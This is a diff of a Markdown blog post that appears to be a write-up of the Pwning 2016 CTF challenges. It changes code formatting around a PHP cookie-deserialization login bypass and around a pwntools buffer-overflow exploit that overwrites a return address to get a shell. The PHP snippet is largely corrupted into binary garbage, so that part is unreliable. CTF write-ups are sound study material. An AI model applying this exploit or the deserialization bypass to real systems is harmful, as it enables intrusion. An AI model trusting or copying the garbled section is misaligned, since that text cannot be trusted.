@@ -13,12 +13,12 @@ In the last post I've promised that I need to look a bit more into the Security 
 ## web 100 - Bulletproof Login Server™
 
 In this task we are give a part of the server code and a login panel that located under <https://monk.pwning2016.p4.team/login.php>
-[code]
+
+```
     ');
 
         if (isset($_COOKIE['remember_me'])) {
             echo('
-[code]
     '.htmlentities(var_ex�
     �z��٥o��������Bo�>�P{w`^��X�1L�YYO��Z�)M�>��*����z�r4��9�����z0���m��ܵ������Z�
     -0�5(��o���i���p#74�pKLʒ�fj�J�b���AqF�];3y�-R�����;�x�H�HpQ�`d�ڧ��
@@ -35,7 +35,7 @@ In this task we are give a part of the server code and a login panel that locate
     �X}H+8�b)���X��*��m�0�!�+����9cBJ�oW����,�}���VJ{�c����_c��v��-/USo���pQ��X��aj�l4脷�*�P��)ƹq(o*�dfR��Bv���z��@�6ܾ?��l��ZtۊǿG��I��o#�����QDY8�Wԗ��8�>:��yr��5Y�;�JɎ�T������3���fdAI�3n7���vԽ�ꓠg��I^#�ޘ}��iP�=j����n��W�[�Z���[v�T1q[�DS^�l�Y�C���\���C�LF��r80�?�N9_�Bz��.o�)
     �MP�4@���-J�/T�����������ýv�fJ<�jg ���3���z.v�d��ğ�[P��g!2ͤ�yQ3���������C������,x��pͫc~���
     �k���Bc��0����`���զ5C��l����.*�(���opGAB���m��<��Pl�ie�E�Q�b����ZGɒ�-��w�Oq�W��������y�M�N�CfB������e"�<(X�m�i@j%^��<$C��V4�! _}�����R����!mz]!��9������s�9߰,�}��8٣�!�����p�X�����4�5�p��|m�Z��}*�H�Vh��V
-[/code]
+```
 
 by examine the code we can see that data that's being passed from a cookie is deserialized and is loosely compared with admin or demo user data. I think we can trick it to let us through. Let's use `curl` here.
 
@@ -89,37 +89,38 @@ But before that we need our payload:
 What we are sending here? First the brackets - we fill he buffer. Next is the counter - we set it to zero so that we do not influence the counting mechanism. Then few chars and at the end we send the address of the return method. After that we call `interactive()` and if everything works we get the shell.
 
 The full script
-[code]
-    #!/usr/bin/python
 
-    from pwn import *
-    import struct
+```
+  #!/usr/bin/python
 
-    payload = ''.join("()"*62)
+  from pwn import *
+  import struct
 
-    def go(is_remote):
-            global HOST
-            global PORT
-            if is_remote:
-                    s = remote(HOST, PORT)
-            else:
-                    context.binary = ELF('./brackets')
-                    s = process(context.binary.path)
+  payload = ''.join("()"*62)
 
-            global payload
+  def go(is_remote):
+          global HOST
+          global PORT
+          if is_remote:
+                  s = remote(HOST, PORT)
+          else:
+                  context.binary = ELF('./brackets')
+                  s = process(context.binary.path)
 
-            payload = payload + struct.pack("I",0x0)+"AAAAAAAA"+struct.pack("Q",0x00000000004005f6)
+          global payload
 
-            s.sendline(payload)
+          payload = payload + struct.pack("I",0x0)+"AAAAAAAA"+struct.pack("Q",0x00000000004005f6)
 
-            s.interactive()
+          s.sendline(payload)
 
-            s.close()
+          s.interactive()
 
-    HOST = 'pwning2016.p4.team'
-    PORT = 1337
-    go(True)
-[/code]
+          s.close()
+
+  HOST = 'pwning2016.p4.team'
+  PORT = 1337
+  go(True)
+```
 
 ![](content/images/2016/11/Zrzut-ekranu-2016-11-26-o-18.13.54.webp)
 
